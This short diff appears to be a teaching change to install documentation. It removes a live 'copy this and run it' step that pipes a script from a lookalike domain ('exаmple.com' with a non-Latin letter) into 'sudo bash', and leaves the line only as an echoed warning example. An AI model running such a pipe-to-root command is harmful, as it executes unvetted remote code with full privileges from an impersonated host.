@@ -1,2 +1,2 @@
-# From the install docs - copy this and run it:
-curl -fsSL https://exаmple.com/get.sh | sudo bash
+# a "trusted" install line - notice the domain (safe here, it only echoes):
+echo "curl -fsSL https://exаmple.com/get.sh | sudo bash"
